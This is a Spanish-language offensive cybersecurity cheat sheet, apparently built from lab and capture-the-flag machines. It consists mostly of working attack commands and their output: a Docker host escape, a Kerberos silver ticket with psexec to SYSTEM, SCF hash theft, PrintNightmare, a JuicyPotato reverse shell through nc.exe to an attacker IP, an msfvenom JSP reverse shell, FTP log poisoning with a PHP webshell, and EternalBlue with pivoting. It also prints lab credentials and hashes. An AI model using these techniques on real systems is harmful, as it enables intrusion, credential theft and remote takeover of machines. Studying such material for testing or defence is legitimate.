---
layout: default
title: "CheatSheet"
permalink: /cs/
---

# CheatSheet CyberSec Ofensive

## Docker

### Docker Remoto

Conectarse:

```docker -H 10.10.45.169 images```

Obtener Shell:

```docker -H 10.10.45.169 run -v /:/mnt --rm -it nginx chroot /mnt bash```

## AD

### DNS TOOL

Agregar registros DNS desde LDAP..

```
python3 dnstool.py -u "intelligence.htb\Tiffany.Molina" -p 'NewIntelligenceCorpUser9876' -a add -r 'perrito.intelligence.htb' -d '10.10.14.251' 10.10.10.248
```

### Silver Ticket

```
impacket-getST 'intelligence.htb/svc_int$' -spn WWW/dc.intelligence.htb -hashes :c699eaac79b69357d9dabee3379547e6 -impersonate Administrator
```

Si te sale este error:

````
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
````

Solo debes actualizar el reloj esto lo hacemos con:

```
sudo apt-get install ntpdate

sudo ntpdate 10.10.10.248
=> 1 Nov 05:23:45 ntpdate[295766]: step time server 10.10.10.248 offset +25202.808937 sec

#OTRA OPCION
sudo apt-get install chrony
sudo timedatectl set-ntp true
sudo ntpdate <machine IP>
```

Exportamos la variable del archivo generado

```
export KRB5CCNAME=Administrator.ccache
```

Obteniendo consola

```
impacket-psexec intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file UmMXtxAq.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service JzWD on dc.intelligence.htb.....
[*] Starting service JzWD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Users\Administrator\Desktop>type root.txt
c813ebe306b5d2880bbd4c3fc78c0328
```

## LDAP

### gMSADump

https://github.com/micahvandeusen/gMSADumper

```
python3 gMSADumper.py -u user -p password -d domain.local
```

## SCF (Shell Command Files)

Esto lo podemos usar para robar la hash de un computador, guardando el archivo con formato **@name.scf** y luego cuando accedan al directorio este generara la consulta por smb.

```
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Luego activamos el responder, y subimos el archivo.

```
sudo responder -I tun0 -A

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:7db7de634789fe9b:AD890AF42AA33006DB91C3D38F64502C:0101000000000000C0653150DE09D2013589EFE0BC55D427000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000020000010E26FBA9187096CADC5424B3B3EF60B8615F85ED6C8D0B66461E1E22D3DCCEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0031003300000000000000000000000000
```

## SPOOLER

https://github.com/calebstewart/CVE-2021-1675

```
Get-Service -Name Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler
```

```
powershell -ep bypass -c 'Import-Module .\CVE-2021-1675.ps1;Invoke-Nightmare'

[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

## JuicyPotato

https://github.com/ohpe/juicy-potato

rs.bat

```
C:\Users\adm1n\Documents\nc.exe 10.10.16.13 4444 -e cmd
```

execute

```
.\JuicyPotato.exe -t * -p C:\Users\adm1n\Documents\rs.bat -l 9002 -c '{4991d34b-80a1-4291-83b6-3328366b9097}'
```

result

```
listening on [any] 4444 ...
connect to [10.10.16.13] from driver.htb [10.10.11.106] 49465
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## TOMCAT

### TOMCAT BYPASS

```
https://seal.htb/manager/status/..;/html
```

### SHELL

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.13 LPORT=4444 -f war > shell.war
```

Nota: reemplace('/html','/status/..;/html')

## Proc Enum

## List Process

```
/proc/sched_debug

runnable tasks:
 S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-----------------------------------------------------------------------------------------------------------
 S        systemd     1       445.759924      3828   120         0.000000      1769.826770         0.000000 0 0 /autogroup-2
 S       kthreadd     2     47838.720959       296   120         0.000000         4.630080         0.000000 0 0 /
 I         rcu_gp     3        13.968795         2   100         0.000000         0.004180         0.000000 0 0 /
. . .
 S        apache2  4043      1830.183525      2693   120         0.000000       329.979700         0.000000 0 0 /autogroup-53
>R        apache2  4048      1829.204925      2690   120         0.000000       334.717910         0.000000 0 0 /autogroup-53
 S        apache2  4071      1830.150655      2677   120         0.000000       325.964820         0.000000 0 0 /autogroup-53
 S        apache2  4102      1832.182545      2666   120         0.000000       333.209330         0.000000 0 0 /autogroup-53
 I    kworker/0:2  4460     47962.478071     17337   120         0.000000       565.512360         0.000000 0 0 /
 I kworker/u256:2  4921     47938.019991      2367   120         0.000000        54.812880         0.000000 0 0 /
 I kworker/u256:0  5062     47956.387321       595   120         0.000000        15.096550         0.000000 0 0 /

```

### Read files proces for PID

```
https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/
```



## PYTHON PRIMITIVES

```
__import__('pty').spawn('/bin/bash')
```

```
schema: yup_lib["object"]({
                code: yup_lib["string"]().required(strapi_helper_plugin_cjs_min["translatedErrors"].required),
                password: yup_lib["string"]().min(6, strapi_helper_plugin_cjs_min["translatedErrors"].minLength).required(strapi_helper_plugin_cjs_min["translatedErrors"].required),
                passwordConfirmation: yup_lib["string"]().min(6, strapi_helper_plugin_cjs_min["translatedErrors"].required).oneOf([yup_lib["ref"]('password'), null], 'components.Input.error.password.noMatch').required(strapi_helper_plugin_cjs_min["translatedErrors"].required)
            
```

## Archivos .crash

### Crashear ejecutables y dumpear la ram

```
Esto ocurre en el caso que:
prctl(PR_SET_DUMPABLE, 1);

Para ello cancelar el flujo del programa con CONTROL + Z
Luego ejecutar ps -a
Luego de ello matar el proceso con kill -BUS [PID]
Luego fg para volver a entrar al proceso y que se genere el crash.
```

### Leer archivo .crash

```
apport-unpack _opt_count.1000.crash output
strings CoreDump
```

## NGINX

### Path traversal via misconfigured alias

https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

```
http://pikaboo.htb/admin../server-status
```

## FTP

### FTP log poisoning

El archivo a infectar es el siguiente:

```
http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

Para ello debemos escribir en el ftp login

```
ftp 10.10.10.249
Connected to 10.10.10.249.
220 (vsFTPd 3.0.3)
Name (10.10.10.249:eduardodesdes): <?php system($_GET['cmd']); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> ^C
ftp> exit
221 Goodbye.
```

Y luego podemos ejecutar el codigo php

```
http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log&cmd=id
```

Con el output

```
Sat Nov 13 04:48:47 2021 [pid 27951] FTP command: Client "::ffff:10.10.16.38", "USER uid=33(www-data) gid=33(www-data) groups=33(www-data)"
...
Sat Nov 13 04:48:52 2021 [pid 27951] FTP command: Client "::ffff:10.10.16.38", "QUIT"
Sat Nov 13 04:48:52 2021 [pid 27951] FTP response: Client "::ffff:10.10.16.38", "221 Goodbye."
```

## LDAP

### LDAP LOGIN

```
ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -b "dc=pikaboo,dc=htb"  -w "J~42%W?PFHl]g"
```

## Pivoting

### Chisel

Para crear un socket usaremos chisel. En la maquina atacante levantamos el chisel server con el comando:

```
chisel server -p 8000 --reverse
```

En la maquina victima, nos pasamos el chisel. (Si es windows pasamos el chisel.exe que encontramos en el repositorio oficial)

```
chisel.exe client 192.168.18.41:8000 R:socks
```

Con esto levantamos un socks5 en el puerto 1080. Configuramos el archivo de proxychains **/etc/proxychains.conf**:

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5  127.0.0.1       1080
```

Luego podemos usar proxychains:

```
proxychains curl 192.168.172.130
```

### Doble Pivote con Metasploit

Primero empezamos con detectar la ip con windows en la segunda red, la cual es: **192.168.172.143**. Verificamos si es vulnerable a eternalblue.

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       192.168.172.143                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

```

Entonces al probar vemos que debemos agregar el socket a la conexion.

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[*] 169.254.106.25:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Lo agregamos con el siguiente comando:

```
set PROXIES SOCKS5:127.0.0.1:1080
```

Y luego podemos ver que si es vulnerable:

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 192.168.172.143:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
[*] 192.168.172.143:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Luego usamos el exploit de eternalblue

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

Elegimos el payload bind_shell, puesto que la maquina objetivo no tienen acceso a nuestra ip pero nosotros si a ella.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
```

Luego actualizamos las direcciones del target.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.172.143
RHOSTS => 192.168.172.143
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.172.143
RHOST => 192.168.172.143
```

Luego ingresamos de nuevo el proxy ya que se borra cuando actualizamos con el comando use.

```
set PROXIES SOCKS5:127.0.0.1:1080
```

Corremos el exploit para obtener la shell.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] 192.168.172.143:445 - Executing automatic check (disable AutoCheck to override)
[*] 192.168.172.143:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.172.143:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
[*] 192.168.172.143:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.172.143:445 - The target is vulnerable.
[*] 192.168.172.143:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.172.143:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
[*] 192.168.172.143:445   - Scanned 1 of 1 hosts (100% complete)
[*] 192.168.172.143:445 - Connecting to target for exploitation.
[+] 192.168.172.143:445 - Connection established for exploitation.
[+] 192.168.172.143:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.172.143:445 - CORE raw buffer dump (25 bytes)
[*] 192.168.172.143:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
[*] 192.168.172.143:445 - 0x00000010  61 73 69 63 20 37 36 30 30                       asic 7600       
[+] 192.168.172.143:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.172.143:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.172.143:445 - Sending all but last fragment of exploit packet
[*] 192.168.172.143:445 - Starting non-paged pool grooming
[+] 192.168.172.143:445 - Sending SMBv2 buffers
[+] 192.168.172.143:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.172.143:445 - Sending final SMBv2 buffers.
[*] 192.168.172.143:445 - Sending last fragment of exploit packet!
[*] 192.168.172.143:445 - Receiving response from exploit packet
[+] 192.168.172.143:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.172.143:445 - Sending egg to corrupted connection.
[*] 192.168.172.143:445 - Triggering free of corrupted buffer.
[*] Started bind TCP handler against 192.168.172.143:4444
[*] Sending stage (200262 bytes) to 192.168.172.143
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 127.0.0.1:1080) at 2022-01-03 12:15:13 -0800
[+] 192.168.172.143:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.172.143:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.172.143:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

Ahora realizamos un ipconfig para verificar las redes presentes.

```
Interface 11
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:f2:5c:18
MTU          : 1500
IPv4 Address : 192.168.172.143
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::887:d7b7:f6cf:2199
IPv6 Netmask : ffff:ffff:ffff:ffff::

Interface 17
============
Name         : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC : 00:0c:29:f2:5c:22
MTU          : 1500
IPv4 Address : 169.254.106.25
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::394a:efca:78d8:6a19
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

Entonces, ahora lo que haremos sera realizar un autoroute

```
meterpreter > background
[*] Backgrounding session 1...

msf6 exploit(windows/smb/ms17_010_eternalblue) > search autoroute

Matching Modules
================

   #  Name                         Disclosure Date  Rank    Check  Description
   -  ----                         ---------------  ----    -----  -----------
   0  post/multi/manage/autoroute                   normal  No     Multi Manage Network Route via Meterpreter Session


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/autoroute

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 169.254.106.0
SUBNET => 169.254.106.0
msf6 post(multi/manage/autoroute) > set CMD add
CMD => add
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module.
[*] Running module against TEST
[*] Adding a route to 169.254.106.0/255.255.255.0...
[+] Route added to subnet 169.254.106.0/255.255.255.0.
[*] Post module execution completed
```

Luego podemos realizar un portscan en el puerto 22 para detectar las ips con servicio SSH.

```
msf6 post(multi/manage/autoroute) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   4  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   7  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/sap/sap_router_portscanner

msf6 post(multi/manage/autoroute) > use 5
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 169.254.106.0/24
RHOSTS => 169.254.106.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 22
PORTS => 22
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 40
THREADS => 40
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 169.254.106.26:       - 169.254.106.26:22 - TCP OPEN
[*] 169.254.106.0/24:     - Scanned  38 of 256 hosts (14% complete)
[*] 169.254.106.0/24:     - Scanned  68 of 256 hosts (26% complete)
[*] 169.254.106.0/24:     - Scanned  80 of 256 hosts (31% complete)
[*] 169.254.106.0/24:     - Scanned 113 of 256 hosts (44% complete)
[*] 169.254.106.0/24:     - Scanned 129 of 256 hosts (50% complete)
[*] 169.254.106.0/24:     - Scanned 160 of 256 hosts (62% complete)
[*] 169.254.106.0/24:     - Scanned 183 of 256 hosts (71% complete)
[*] 169.254.106.0/24:     - Scanned 205 of 256 hosts (80% complete)
[*] 169.254.106.0/24:     - Scanned 238 of 256 hosts (92% complete)
[*] 169.254.106.0/24:     - Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

Lo que ahora haremos sera levantar un socket para poder conectarnos por ssh a esa direccion IP.

```
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server
```

Ahora podemos configurar de nuevo nuestro proxychains en el socket 9050.

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5  127.0.0.1       9050
```

Luego, nos conectamos usando proxychains para verificar que el proxychains esta conectado correctamente.

```
proxychains ssh leonardosd@169.254.106.26
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-169.254.106.26:22-<><>-OK
leonardosd@169.254.106.26's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-43-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

152 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Jan  3 11:24:26 2022 from 169.254.106.25
leonardosd@ubuntu:~$ 
```



















































## WORDLISTS

### Tomcat

```
https://gist.githubusercontent.com/KINGSABRI/277e01a9b03ea7643efef8d5747c8f16/raw/c491a2706d6aa553863b7a7c395c457ed9e63a2e/tomcat-directory.list
```

